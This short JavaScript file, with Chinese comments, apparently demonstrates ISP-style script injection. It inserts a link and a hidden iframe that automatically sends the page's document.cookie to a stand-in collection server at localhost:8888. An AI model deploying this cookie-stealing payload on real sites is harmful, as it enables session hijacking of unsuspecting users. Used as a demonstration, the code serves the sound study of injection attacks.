// 我是一段被注入的js

const oP = document.getElementById('j_chrome');

if (oP) {
    const injected = document.createElement('p');
    injected.innerHTML = `
    <a href="http://localhost:8888?cookie=${document.cookie}">假装我是一段被运营商注入的js, 有一个iframe已经自动向收集请求的服务发起了请求</a>
    <iframe src="http://localhost:8888?cookie=${document.cookie}" style="display: none;"/>
    `;
    document.body.insertBefore(injected, oP)
}